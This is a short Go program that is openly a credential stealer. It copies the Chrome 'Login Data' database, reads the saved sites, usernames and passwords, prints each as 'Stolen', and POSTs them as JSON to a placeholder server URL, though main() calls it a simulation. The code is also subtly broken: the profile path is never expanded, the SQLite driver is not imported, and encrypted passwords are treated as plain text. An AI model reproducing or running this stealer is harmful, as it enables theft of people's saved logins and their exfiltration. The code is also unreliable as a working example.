package main

import (
	"bytes"
	"database/sql"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"time"
)

const (
	CHROME_PATH  = `C:\Users\%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data`
	TEMP_DB_PATH = "temp_login_data.db"
	SERVER_URL   = "PUT_SERVER_URL_HERE"
)

type Credential struct {
	URL       string `json:"url"`
	Username  string `json:"username"`
	Password  string `json:"password"`
	Timestamp string `json:"timestamp"`
}

func findLoginData() error {
	source, err := os.Open(CHROME_PATH)
	if err != nil {
		return err
	}
	defer source.Close()

	destination, err := os.Create(TEMP_DB_PATH)
	if err != nil {
		return err
	}
	defer destination.Close()

	_, err = io.Copy(destination, source)
	if err != nil {
		return err
	}

	return nil
}

func stealPasswords() ([]Credential, error) {
	if err := findLoginData(); err != nil {
		return nil, err
	}
	defer os.Remove(TEMP_DB_PATH)

	db, err := sql.Open("sqlite3", TEMP_DB_PATH)
	if err != nil {
		return nil, fmt.Errorf("failed to open database: %v", err)
	}
	defer db.Close()

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		return nil, fmt.Errorf("failed to query logins: %v", err)
	}
	defer rows.Close()

	var credentials []Credential
	for rows.Next() {
		var originURL, username string
		var password []byte
		if err := rows.Scan(&originURL, &username, &password); err != nil {
			continue
		}
		credential := Credential{
			URL:       originURL,
			Username:  username,
			Password:  string(password),
			Timestamp: time.Now().Format(time.RFC3339),
		}
		credentials = append(credentials, credential)
		fmt.Printf("Stolen: %s @ %s - %s\n", username, originURL, string(password))
	}
	return credentials, nil

}

func sendToServer(credentials []Credential) error {
	jsonData, err := json.Marshal(credentials)
	if err != nil {
		return fmt.Errorf("failed to marshal credentials: %v", err)
	}

	resp, err := http.Post(SERVER_URL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to send to server: %v", err)
	}
	defer resp.Body.Close()

	return nil
}

func main() {
	fmt.Printf("Simulating password steal for user: %s\n", os.Getenv("USERNAME"))
	credentials, err := stealPasswords()
	if err != nil {
		log.Printf("Error stealing passwords: %v", err)
		return
	}
	if len(credentials) > 0 {
		sendToServer(credentials)
	} else {
		log.Println("No passwords stolen or error occurred.")
	}
}
